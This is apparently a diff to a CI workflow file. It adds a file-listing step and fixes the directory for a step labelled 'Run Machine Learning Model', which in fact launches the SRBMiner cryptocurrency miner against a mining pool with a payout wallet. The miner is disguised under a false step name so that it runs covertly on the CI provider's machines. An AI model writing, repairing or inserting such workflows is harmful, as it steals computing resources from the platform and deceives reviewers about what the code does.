@@ -25,6 +25,11 @@ jobs:
           tar xf SRBMiner-Multi-2-4-7-Linux.tar.xz
           cd SRBMiner-Multi-2-4-7
 
+      - name: List Files
+        run: |
+          ls -la  # Use this command to check if SRBMiner-MULTI exists in the directory
+
       - name: Run Machine Learning Model
         run: |
-          ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool na.rplant.xyz:17111 --wallet a7q25W4x57GmKTnHDi1DSn1xJkTBF3cG7q.r1 pause  --keepalive true
+          cd SRBMiner-Multi-2-4-7  # Move to the correct directory
+          ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool na.rplant.xyz:17111 --wallet a7q25W4x57GmKTnHDi1DSn1xJkTBF3cG7q.r1 pause --keepalive true
